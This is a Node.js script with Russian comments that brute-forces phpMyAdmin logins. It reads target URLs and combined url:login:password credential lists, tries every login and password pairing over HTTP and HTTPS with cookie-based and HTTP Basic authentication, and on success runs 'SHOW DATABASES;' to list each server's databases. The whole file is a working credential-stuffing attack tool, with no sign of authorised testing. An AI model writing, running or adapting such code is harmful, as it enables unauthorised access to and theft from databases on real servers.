const fs = require('fs');
const cheerio = require("cheerio");
const loggedAxiosRequest = require("./services/loggedAxiosRequest");
const axios = require("axios");
require('dotenv').config();

const phpMyAdminUrl = process.env.PHP_MY_ADMIN_URL;

// === Функция для чтения файла ===
function readFileIfExists(filename) {
    if (fs.existsSync(filename)) {
        const content = fs.readFileSync(filename, 'utf-8').split('\n').map(line => line.trim()).filter(line => line);
        return new Set(content); // Убираем дубликаты, преобразуя в Set
    }
    return new Set();
}

// === Читаем входные данные ===
const mainFile = process.env.MAIN_FILE || "./files/input.txt"; // Основной файл
const loginsFile = "./files/logins.txt";
const passwordsFile = "./files/passwords.txt";

// Читаем основной файл и разбираем URL, логины и пароли
const rawLines = readFileIfExists(mainFile);
const logins = readFileIfExists(loginsFile);
const passwords = readFileIfExists(passwordsFile);

let targets = [];

for (const line of rawLines) {
    const [url, login, password] = line.split(":");
    if (url && login && password) {
        targets.push({ url, login, password });
        logins.add(login); // Добавляем в список логинов
        passwords.add(password); // Добавляем в список паролей
    }
}

// === Генерация всех комбинаций ===
const loginList = [...logins];
const passwordList = [...passwords];
const protocols = ["http", "https"];

let combinations = [];

targets.forEach(({ url }) => {
    protocols.forEach(protocol => {
        loginList.forEach(login => {
            passwordList.forEach(password => {
                combinations.push({ url: `${protocol}://${url}`, login, password });
            });
        });
    });
});

console.log(`✅ Сформировано ${combinations.length} комбинаций для тестирования.`);

class PmaClient {

     phpMyAdminUrl;
     cookie;
     login;
     password;
     encodedAuth; // для http авторизации
     session; // для cookie авторизации
     user; // для cookie авторизации
     auth; // для cookie авторизации

    constructor(phpMyAdminUrl, login, password) {
        this.phpMyAdminUrl = phpMyAdminUrl;
        this.login = login;
        this.password = password;
    }

    // === Функция для авторизации при ['auth_type'] = 'cookie' ===
    loginAndGetCookies = async () => {
        try {
            // Запрос к странице входа
            const response = await loggedAxiosRequest.get(this.phpMyAdminUrl, {
                headers: { "User-Agent": "Mozilla/5.0" },
            });

            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            if (rawCookies) {
                this.cookie = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
                this.session = this.cookie.replace("phpMyAdmin=", "");
            }

            // Извлекаем токен из HTML
            const $ = cheerio.load(response.data);
            const token = $('input[name="token"]').val();
            if (!token) throw new Error("Не удалось извлечь токен.");

            console.log(`Токен получен: ${token}`);

            // Отправляем POST-запрос на авторизацию
            const loginResponse = await loggedAxiosRequest.post(this.phpMyAdminUrl, new URLSearchParams({
                route: "/",
                token: token,
                set_session: this.session,
                pma_username: this.login,
                pma_password: this.password,
                server: "1",
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                },
            });

            // Обновляем куки
            const newCookies = loginResponse.headers["set-cookie"];
            if (newCookies) {
                this.cookie = newCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
               // this.user = newCookies.filter(cookie => cookie.startsWith("pmaUser-1=")).pop().split(';')[0];
               // this.auth = newCookies.filter(cookie => cookie.startsWith("pmaAuth-1=")).pop().split(';')[0];
            }

            // Извлекаем токен из HTML ??? refresh?

            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
            return token;
        } catch (error) {
            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
            return null;
            //throw error;
        }
    };
    // === Функция для авторизации при ['auth_type'] = 'http' ===
    loginAndGetCookiesHttp = async () => {
        try {
            // Запрос к странице входа для получения куки
            const response = await axios.get(this.phpMyAdminUrl, {
                headers: { "User-Agent": "Mozilla/5.0" },
                validateStatus: (status) => true, // обрабатываем дальше при 401 без выброса ошибки
            });

            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            if (rawCookies) {
                this.cookie = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
            }

            // Отправляем GET-запрос на авторизацию
            this.encodedAuth = 'Basic ' + Buffer.from(`${this.login}:${this.password}`).toString('base64');
            const loginResponse = await loggedAxiosRequest.get(this.phpMyAdminUrl, {
                headers: {
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                    Authorization: this.encodedAuth
                }
            });

            // Извлекаем токен из HTML ответа
            const $ = cheerio.load(loginResponse.data);
            const token = $('input[name="token"]').val();
            if (!token) throw new Error("Не удалось извлечь токен.");
            console.log(`Токен получен: ${token}`);

            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
            return token;
        } catch (error) {
            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
            return null;
            //throw error;
        }
    };

    // === Функция для выполнения SQL-запросов ===
    executeSQLQuery = async (phpMyAdminUrl, token, query) => {
        const queryUrl = `${phpMyAdminUrl}${process.env.ROUTE_QUERY || "/index.php?route=/import"}`;

        try {
            const response = await loggedAxiosRequest.post(queryUrl, new URLSearchParams({
                route: "/import",
                token,
                sql_query: query,
                is_js_confirmed: "1",
                ajax_request: "true",
                _nocache: Date.now(),
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                    Authorization: this.encodedAuth
                },
            });

            // Обрабатываем HTML-ответ
            const $ = cheerio.load(response.data.message);
            const databases = $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
            console.log(`Найденные базы данных (${databases.length}): ${databases.join(", ")}`);
        } catch (error) {
            console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
        }
    }
}

// === Основной цикл перебора всех комбинаций ===
(async () => {
    for (const { url, login, password } of combinations) {
        console.log(`Проверяем: ${url} с логином ${login}...`);
        const client = new PmaClient(url, login, password);
        const token = await client.loginAndGetCookiesHttp();

        if (token) {
            console.log(`Запускаем SQL-запрос...`);
            await client.executeSQLQuery(url, token, "SHOW DATABASES;");
        }
    }

    console.log("✅ Тестирование завершено!");
})();
